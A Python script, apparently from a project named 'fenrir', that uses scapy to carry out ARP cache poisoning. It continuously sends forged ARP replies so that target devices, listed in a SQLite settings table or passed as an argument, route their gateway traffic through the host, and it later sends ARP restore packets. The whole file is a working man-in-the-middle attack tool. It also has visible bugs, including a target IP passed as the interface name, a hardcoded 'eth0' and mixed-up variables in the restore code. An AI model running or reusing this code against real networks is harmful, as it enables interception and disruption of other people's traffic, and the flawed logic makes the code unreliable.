#!/bin/env python3

from scapy.all import Ether, ARP, send, srp
from pyroute2 import IPRoute, IPDB
from time import time, sleep
from sqlite3 import connect, OperationalError
from sys import argv, stdout
from logging import basicConfig, info, debug, INFO
from argparse import ArgumentParser
from signal import signal, SIGINT, SIGTERM


def getmac(targetip, interface):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=2, iface=interface,
                    verbose=False)[0][0][1].hwsrc
    return targetmac


def getmydefaultgws(allowedinterface=None):
    ip = IPRoute()
    interfacedata = IPDB().interfaces
    defaultgws = dict()
    for route in ip.get_default_routes():
        routedata = zip(route.get_attrs('RTA_GATEWAY'), route.get_attrs('RTA_OIF'))
        for gw, ifidx in list(routedata):
            ifname = interfacedata[ifidx].ifname if ifidx in interfacedata.keys() else 'unknown'
            debug(f'found gatewayIP {gw} on interface {ifname}')
            if allowedinterface and ifname != allowedinterface:
                debug(f'not adding {gw} since {ifname} != {allowedinterface}')
                continue
            defaultgws[gw] = getmac(targetip=gw, interface=ifname)
    return defaultgws


class Arper:
    def __init__(self, interface='eth0', dbpath='/var/cache/fenrir/') -> None:
        self.settingsdbpath = dbpath + 'settings.sqlite'
        self.interface = interface
        self.looptime = 200
        self.endnow = False

    def doend(self, signum, frame) -> None:
        self.endnow = True

    @staticmethod
    def spoofarpcache(targetip, targetmac, sourceip) -> None:
        spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
        send(spoofed, iface='eth0', verbose=False)

    @staticmethod
    def restorearp(targetip, targetmac, sourceip, sourcemac) -> None:
        packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip,
                     hwdst=targetmac, pdst=targetip)
        send(packet, iface='eth0', verbose=False)
        debug(f'ARP Table restored to normal for {targetip}')

    def getspoofipsfromsettings(self, current):
        newmacs = set()
        cooloff = set()
        try:
            with connect(f'file:{self.settingsdbpath}?mode=ro', timeout=10, check_same_thread=False, uri=True) as db:
                cursor = db.cursor()
                for row in cursor.execute('SELECT ip from settings WHERE active=1;').fetchall():
                    newmacs.add(row[0])
            cooloff = current - newmacs
        except OperationalError as e:
            debug(f'unable to open Database at {self.settingsdbpath}')

        return cooloff, newmacs

    def spoofipsfromconfig(self)  -> None:
        sendspoof = dict()
        sendcooloff = dict()
        gwdict = getmydefaultgws(self.interface)
        while not self.endnow and len(gwdict) < 1:
            sleep(1)
            debug(f'no default routes fond for {self.interface}')
            gwdict = getmydefaultgws(self.interface)

        loopcount = 5
        while not self.endnow:
            startmillis = round(time() * 1000)
            loopcount = loopcount + 1
            if loopcount > 5:
                # determine ips to be spoofed or restored
                cooloff, spoofips = self.getspoofipsfromsettings(
                    set(sendspoof.keys()))
                for cooloffip in cooloff:
                    sendcooloff[cooloffip] = [getmac(cooloffip, self.interface), 10]
                    if cooloffip in sendspoof.keys():
                        del sendspoof[cooloffip]
                for ip in spoofips:
                    if ip not in sendspoof.keys():
                        sendspoof[ip] = getmac(ip, self.interface)
                loopcount = 0

            # send spoof packets of my gateways to configured-spoof-IPs
            for ip, mac in sendspoof.items():
                for gw in gwdict.keys():
                    debug(f'send spoof of {gw} to {ip} (MAC: {mac}')
                    self.spoofarpcache(ip, mac, gw)

            # restore original MAC to face-out IPs and remove once countdown expires
            coolofexpired = list()
            for ip, macdelaylist in sendcooloff.items():
                for gwip, gwmac in gwdict.items():
                    self.restorearp(ip, macdelaylist[0], gwip, gwmac)
                    cooloffcount = int(macdelaylist[1]) - 1
                    if cooloffcount <= 0:
                        coolofexpired.append(ip)
                    sendcooloff[ip] = [macdelaylist[0], cooloffcount]
                    debug(
                        f'sent ARP restore to: {ip}; counter at {cooloffcount}')
            for cooloffexpiredip in coolofexpired:
                debug(f'remove cooloffIP: {cooloffexpiredip} ')
                del sendcooloff[cooloffexpiredip]

            exectime = round(time() * 1000) - startmillis
            sleeptime = self.looptime - exectime
            if sleeptime > 0:
                debug(f'sleep for {sleeptime} ms')
                sleep(sleeptime / 1000)

    def spoofips(self, ips=[], gwips=[]) -> None:
        info(f'start spoofing for {", ".join(ips)}')
        ipmacs = list()
        for ip in ips:
            mac = getmac(ip, self.interface)
            ipmacs.append(mac)
            debug(f'got mac {mac} for IP {ip}')
        try:
            while not self.endnow:
                startmillis = round(time() * 1000)
                for dstip in ips:
                    for i in range(0, len(gwips)):
                        self.spoofarpcache(dstip, ipmacs[i], gwips[i])
                        debug(
                            f'send spoof of {gwips[i]} to {dstip} (MAC: {ipmacs[i]}')

                exectime = round(time() * 1000) - startmillis
                sleeptime = self.looptime - exectime
                if sleeptime > 0:
                    debug(f'sleep for {sleeptime} ms')
                    sleep(sleeptime / 1000)

        except KeyboardInterrupt:
            info('stop spoofing')
            for gwip in gwips:
                gwmac = getmac(ip, self.interface)
                for i, dstip in enumerate(ips):
                    self.restorearp(dstip, ipmacs[i], gwip, gwmac)

    def run(self, targetip=None) -> None:
        signal(SIGINT, self.doend)
        signal(SIGTERM, self.doend)
        # check if interface is present und up
        info(f'checking if interface {self.interface} is present...')
        ip = IPDB()
        while not self.endnow and self.interface not in ip.interfaces:
            debug(f'interface {self.interface} not present waiting...')
            sleep(2)
        info(f'found interface {self.interface} on system. checking status...')
        while not self.endnow and ip.interfaces[self.interface].operstate.lower() != 'up':
            debug(f'interface {self.interface} not ready waiting...')
            sleep(2)
        info(f'interface {self.interface} ready. starting arp...')
        
        if not targetip:
            self.spoofipsfromconfig()
            info('arping stoped.')
        else:
            self.spoofips(ips=[targetip, ], gwips=list(
                getmydefaultgws(self.interface).keys()))


def arper(interface='eth0', targetip=None) -> None:
    info('statring arping...')
    Arper(interface=interface).run(targetip=targetip)


def main() -> None:
    basicConfig(stream=stdout, level=INFO)
    parser = ArgumentParser()
    parser.add_argument('--targetip', help='exit after first completed scan')
    args = parser.parse_args()
    arper(args.targetip)


if __name__ == "__main__":
    main()
